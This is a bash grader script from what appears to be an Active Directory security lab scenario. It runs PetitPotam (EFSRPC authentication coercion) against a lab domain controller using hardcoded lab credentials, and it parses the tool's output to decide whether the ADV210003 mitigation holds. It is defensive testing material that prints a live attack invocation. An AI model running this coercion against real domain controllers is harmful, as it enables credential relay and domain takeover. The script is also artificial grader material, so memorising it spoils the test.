#!/usr/bin/env bash
# meta4/ad-vm/scenario-17/verify-poc.sh
# PASS (exit 0) iff EFSRPC coercion (PetitPotam) is refused.
#
# REWRITTEN. The previous version graded a SUCCESSFUL COERCION AS BLOCKED.
#
# It searched the whole transcript for 'access_denied' and exited 0 on the
# first match. But PetitPotam walks a LIST of EFSRPC functions: Microsoft
# patched EfsRpcOpenFileRaw (Aug 2021), so on a vulnerable host the tool prints
# the denial for that one and then moves on to a function that still works.
# Observed verbatim on the 2026-07-26 gate run, all in one run:
#
#   [-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
#   [+] OK! Using unpatched function!
#   [+] Got expected ERROR_BAD_NETPATH exception!!
#   [+] Attack worked!
#
# The old check matched line 1 and reported "ADV210003 RPC filter in place".
# The attack had just succeeded. A host in the exact state this scenario
# injects -- partially patched, still coercible -- scored as fully remediated,
# so gate 1 could never fail for the right reason and the scenario was
# unwinnable in the direction that matters.
#
# Ordering is therefore the whole fix: SUCCESS EVIDENCE OUTRANKS DENIAL
# EVIDENCE. A per-function denial says something about one function; "Attack
# worked!" says something about the host. Only a transcript with no success
# marker anywhere can mean the coercion was refused.

set -uo pipefail
cd "$(mktemp -d)"

DC=10.20.30.5
LISTENER=10.20.30.10

OUT=$(timeout 30 /usr/bin/impacket-PetitPotam \
    "$LISTENER" "$DC" \
    -u alice -p 'Password1!' -d 'corp.local' 2>&1)
RC=$?

echo "--- EFSRPC probe output (rc=$RC) ---"
echo "$OUT"
echo "--- /probe ---"

# --- cannot reach the DC at all: HARNESS ERROR, never a verdict ---
# A host that is down is not a host that was hardened. Checked before any
# verdict so an unreachable DC cannot be read as a successful mitigation.
if echo "$OUT" | grep -qiE 'connection refused|unreachable|timed out|connection reset|\[Errno 1(01|10|11)\]|Name or service not known'; then
    echo "[verify-poc-17] HARNESS ERROR: cannot reach $DC over SMB" >&2
    exit 2
fi
if [ "$RC" -eq 124 ]; then
    echo "[verify-poc-17] HARNESS ERROR: PetitPotam timed out after 30s" >&2
    echo "[verify-poc-17] a hung probe is not evidence the coercion was refused" >&2
    exit 2
fi

# --- COERCION SUCCEEDED (checked FIRST, outranks any per-function denial) ---
# 'ERROR_BAD_NETPATH' is the success signal: the DC accepted the call and tried
# to authenticate to the listener path, which is the coercion itself.
if echo "$OUT" | grep -qiE 'Attack worked|ERROR_BAD_NETPATH|Using unpatched function'; then
    echo "[verify-poc-17] EFSRPC coercion ACCEPTED -- PetitPotam still works" >&2
    echo "[verify-poc-17] ADV210003 RPC filter is NOT blocking EFSRPC" >&2
    exit 1
fi

# --- refused on every function it tried ---
# Only reachable when no success marker appeared anywhere above.
if echo "$OUT" | grep -qiE 'access_denied|rpc_s_access_denied|ept_s_not_registered|procnum.*out.*of.*range|rpc.*filtered|STATUS_OBJECT_NAME_NOT_FOUND'; then
    echo "[verify-poc-17] every EFSRPC function refused -- ADV210003 RPC filter in place"
    exit 0
fi

echo "[verify-poc-17] no recognised coercion or denial signature -- treating as FAIL" >&2
echo "[verify-poc-17] an unreadable transcript is not evidence of remediation" >&2
exit 1
